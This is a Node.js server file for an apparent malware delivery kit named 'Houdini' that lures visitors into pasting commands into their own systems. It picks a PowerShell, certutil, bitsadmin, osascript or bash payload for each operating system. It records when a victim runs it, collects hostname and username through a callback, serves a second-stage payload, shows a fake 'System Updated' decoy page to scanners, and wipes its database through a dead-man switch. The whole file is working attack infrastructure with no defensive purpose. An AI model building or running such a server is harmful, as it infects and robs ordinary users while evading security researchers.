const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const crypto = require('crypto');
const useragent = require('useragent');
const rateLimit = require('express-rate-limit');

const config = require('./config');
const { db, stmts } = require('./db');
const winPs1 = require('./payloads/win_ps1');
const winCert = require('./payloads/win_certutil');
const winBits = require('./payloads/win_bitsadmin');
const macOsascript = require('./payloads/mac_osascript');
const linuxBash = require('./payloads/linux_bash');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.static('public'));
app.use('/dashboard', express.static('dashboard'));

// Rate limiting
const limiter = rateLimit({
    windowMs: config.RATE_LIMIT_WINDOW,
    max: config.RATE_LIMIT_MAX,
    message: {error: 'Rate limit exceeded'}
});
app.use('/api/', limiter);

// Bot detection middleware — UPDATED: flags tokens immediately
function botCheck(req, res, next) {
    const ua = req.headers['user-agent'] || '';
    const suspicious = /Headless|PhantomJS|Selenium|Puppeteer|bot|crawl/i.test(ua);
    if (suspicious && req.path !== '/api/beacon') {
        stmts.flagBot.run(req.ip, ua, 'server-side pattern', Date.now());
        // NEW: Flag the token if one is present
        if (req.query.t) {
            try {
                db.prepare('UPDATE tokens SET bot_flag = 1 WHERE id = ?').run(req.query.t);
            } catch(e) {}
        }
    }
    next();
}
app.use(botCheck);

// Kill switch check
function killSwitch(req, res, next) {
    const state = stmts.getState.get('killswitch');
    if (state && state.value === 'true') {
        return res.status(503).json({error: 'Service temporarily unavailable'});
    }
    next();
}
app.use(killSwitch);

// Decoy HTML for flagged tokens
const decoyHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body{background:#f3f4f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
        .card{max-width:500px;background:white;padding:48px;border-radius:12px;box-shadow:0 4px 6px rgba(0,0,0,0.05);text-align:center;}
        .icon{font-size:48px;margin-bottom:16px;}
        h2{color:#059669;font-size:24px;margin-bottom:12px;font-weight:600;}
        p{color:#6b7280;line-height:1.6;font-size:15px;}
        .footer{margin-top:24px;font-size:12px;color:#9ca3af;}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">✓</div>
        <h2>System Updated</h2>
        <p>Your system is already running the latest version.<br>No action is required at this time.</p>
        <div class="footer">CloudSecure Maintenance • Build 2026.08.1</div>
    </div>
</body>
</html>`;

// OS Detection from UA
function detectOS(ua) {
    const agent = useragent.parse(ua);
    const os = agent.os.family;
    if (/Windows/i.test(os)) return 'Windows';
    if (/Mac OS|OS X/i.test(os)) return 'Mac OS';
    if (/Linux|Ubuntu|Debian|Fedora/i.test(os)) return 'Linux';
    return 'Windows';
}

// Generate token
function generateToken(ip, ua) {
    const token = config.TOKEN_PREFIX + crypto.randomBytes(16).toString('hex');
    const os = detectOS(ua);
    const now = Date.now();

    stmts.insertToken.run(
        token, ip, ua, os, null, now, now + config.TOKEN_TTL,
        JSON.stringify([{stage: 'viewed', timestamp: now}])
    );
    return {token, os};
}

// Main route — serve landing page
app.get('/', (req, res) => {
    const preToken = req.query.t;
    let tokenData;

    if (preToken) {
        const existing = stmts.getToken.get(preToken);
        if (existing && existing.ip === req.ip) {
            tokenData = {token: preToken, os: existing.os_detected};
        } else {
            return res.status(403).send('Token invalid or IP mismatch');
        }
    } else {
        tokenData = generateToken(req.ip, req.headers['user-agent'] || '');
    }

    // Check IP binding
    if (config.IP_BINDING && preToken) {
        const t = stmts.getToken.get(preToken);
        if (t && t.ip !== req.ip) {
            return res.status(403).send('Token bound to different IP');
        }
    }

    // Time gate check
    const hour = new Date().getHours();
    if (hour < config.TIME_GATE.start || hour >= config.TIME_GATE.end) {
        return res.status(403).send('Service unavailable at this time');
    }

    // NEW: Check if token is bot-flagged — serve decoy instead of real page
    const t = stmts.getToken.get(tokenData.token);
    if (t && t.bot_flag === 1) {
        return res.send(decoyHtml);
    }

    // Serve HTML with injected vars
    const html = require('fs').readFileSync(path.join(__dirname, 'public/index.html'), 'utf8');
    const rendered = html
        .replace('{{TOKEN}}', tokenData.token)
        .replace('{{OS}}', tokenData.os)
        .replace('{{SERVER}}', config.SERVER_URL);

    res.send(rendered);
});

// Beacon endpoint
app.post('/api/beacon', (req, res) => {
    const {token, stage, meta} = req.body;
    if (!token) return res.status(400).json({error: 'Missing token'});

    const t = stmts.getToken.get(token);
    if (!t) return res.status(404).json({error: 'Token not found'});

    // Check expiry
    if (t.expires_at < Date.now()) {
        return res.status(410).json({error: 'Token expired'});
    }

    // NEW: Flag token if client-side bot detection triggered
    if (stage === 'bot_detected') {
        try {
            db.prepare('UPDATE tokens SET bot_flag = 1 WHERE id = ?').run(token);
        } catch(e) {}
    }

    const stages = JSON.parse(t.stages || '[]');
    stages.push({stage, timestamp: Date.now(), meta});
    stmts.updateStages.run(JSON.stringify(stages), token);

    // Broadcast update
    io.emit('stats', getStatsData());

    res.json({ok: true});
});

// Payload endpoint
app.get('/api/payload', (req, res) => {
    const {token, os} = req.query;
    if (!token) return res.status(400).json({error: 'Missing token'});

    const t = stmts.getToken.get(token);
    if (!t) return res.status(404).json({error: 'Token not found'});

    // Update OS confirmation
    stmts.updateStages.run(
        JSON.stringify([...JSON.parse(t.stages || '[]'), {stage: 'os_confirmed', timestamp: Date.now(), meta: {os}}]),
        token
    );

    let payload;
    const isDemo = config.DEMO_MODE;

    if (os === 'mac' || os === 'Mac OS') {
        payload = macOsascript.generate(token, config.SERVER_URL);
    } else if (os === 'linux' || os === 'Linux') {
        payload = linuxBash.generate(token, config.SERVER_URL);
    } else {
        // Windows — primary PowerShell -enc, with fallbacks available via alt param
        const variant = req.query.variant || 'ps1';
        if (variant === 'cert') payload = winCert.generate(token, config.SERVER_URL);
        else if (variant === 'bits') payload = winBits.generate(token, config.SERVER_URL);
        else payload = winPs1.generate(token, config.SERVER_URL, isDemo);
    }

    res.json({
        payload,
        prestige: config.PRESTIGE_URL,
        prestigeDelay: config.PRESTIGE_DELAY
    });
});

// Callback endpoint (execution confirmation)
app.post('/api/callback', (req, res) => {
    const {token, h, u, d} = req.body;
    if (!token) return res.status(400).json({error: 'Missing token'});

    const t = stmts.getToken.get(token);
    if (!t) return res.status(404).json({error: 'Token not found'});

    stmts.markExecuted.run(JSON.stringify({hostname: h, username: u, data: d}), token);

    const stages = JSON.parse(t.stages || '[]');
    stages.push({stage: 'callback', timestamp: Date.now(), meta: {h, u, d}});
    stmts.updateStages.run(JSON.stringify(stages), token);

    io.emit('stats', getStatsData());
    res.json({ok: true, next: 'stage2'});
});

// Stage 2 delivery
app.get('/stage2', (req, res) => {
    const token = req.query.token || req.headers['x-houdini-token'];
    if (!token) return res.status(400).send('// Missing token');

    const t = stmts.getToken.get(token);
    if (!t) return res.status(404).send('// Invalid token');

    // Serve active payload
    const payloadPath = path.join(__dirname, 'payloads/stage2', config.ACTIVE_PAYLOAD);
    try {
        const payload = require('fs').readFileSync(payloadPath, 'utf8');
        res.type('text/plain').send(payload);
    } catch(e) {
        res.status(500).send('// Payload not found');
    }
});

// Admin API
function requireAdmin(req, res, next) {
    if (req.headers['x-admin-key'] !== config.ADMIN_KEY) {
        return res.status(401).json({error: 'Unauthorized'});
    }
    next();
}

app.get('/api/admin/stats', requireAdmin, (req, res) => {
    res.json(getStatsData());
});

app.post('/api/admin/killswitch', requireAdmin, (req, res) => {
    const {active} = req.body;
    stmts.setState.run('killswitch', active ? 'true' : 'false');
    io.emit('killState', active);
    res.json({killSwitch: active});
});

app.post('/api/admin/heartbeat', requireAdmin, (req, res) => {
    stmts.setState.run('last_heartbeat', Date.now().toString());
    res.json({ok: true});
});

function getStatsData() {
    const since = Date.now() - 24 * 60 * 60 * 1000;
    const stats = stmts.getStats.get(since);
    const recent = stmts.getRecent.all();

    // Calculate funnel
    const funnel = {viewed: 0, checked: 0, copied: 0, executed: 0};
    recent.forEach(t => {
        const stages = JSON.parse(t.stages || '[]').map(s => s.stage);
        if (stages.includes('viewed')) funnel.viewed++;
        if (stages.includes('check_passed')) funnel.checked++;
        if (stages.includes('copied')) funnel.copied++;
        if (t.executed) funnel.executed++;
    });

    return {
        total: stats.total,
        executed: stats.executed,
        bots: stats.bots,
        funnel,
        recent
    };
}

// Dead man's switch check
setInterval(() => {
    if (!config.DEAD_MAN_ENABLED) return;
    const last = stmts.getState.get('last_heartbeat');
    if (last && (Date.now() - parseInt(last.value)) > config.DEAD_MAN_TIMEOUT) {
        console.log('[Houdini] Dead man triggered — purging database');
        db.exec('DELETE FROM tokens; DELETE FROM bot_hits;');
        stmts.setState.run('killswitch', 'true');
    }
}, 60000);

// Cleanup expired tokens
setInterval(() => {
    stmts.purgeExpired.run(Date.now());
}, 300000); // Every 5 min

// Socket.IO connection
io.on('connection', (socket) => {
    socket.emit('stats', getStatsData());
    const ks = stmts.getState.get('killswitch');
    socket.emit('killState', ks && ks.value === 'true');
});

// Start
server.listen(config.PORT, () => {
    console.log(`[Houdini] Server running on port ${config.PORT}`);
    console.log(`[Houdini] Dashboard: ${config.SERVER_URL}/dashboard`);
    console.log(`[Houdini] Demo mode: ${config.DEMO_MODE}`);
    console.log(`[Houdini] Kill switch: ${config.KILL_SWITCH ? 'ACTIVE' : 'inactive'}`);
});
